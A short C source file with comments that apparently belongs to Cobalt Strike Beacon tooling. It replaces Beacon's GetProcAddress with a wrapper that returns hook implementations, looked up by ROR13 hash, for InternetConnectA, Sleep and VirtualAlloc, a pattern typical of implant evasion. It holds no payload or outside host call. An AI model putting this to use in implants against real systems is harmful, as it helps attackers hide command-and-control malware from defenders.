/*
 * _GetProcAddress Intercept — Runtime API Hook Dispatch
 *
 * Rather than patching each call site individually, Beacon's
 * GetProcAddress is replaced with this wrapper. It returns a pointer
 * to the hook implementation when a registered target function is
 * requested. Crystal Palace generates the ROR13 hash lookup table
 * at link time based on the addhook directives in the spec file.
 *
 * Spec file directives:
 *   addhook "WININET$InternetConnectA" "_InternetConnectA"
 *   addhook "KERNEL32$Sleep"           "_Sleep"
 *   addhook "KERNEL32$VirtualAlloc"    "_VirtualAlloc"
 */

#include <windows.h>

FARPROC WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    /* ordinals pass through unchanged */
    if (((ULONG_PTR)lpProcName >> 16) == 0) {
        return GetProcAddress(hModule, lpProcName);
    }

    /* look up a hook for this function name */
    FARPROC hook = __resolve_hook(ror13hash(lpProcName));
    if (hook != NULL) return hook;

    return GetProcAddress(hModule, lpProcName);
}
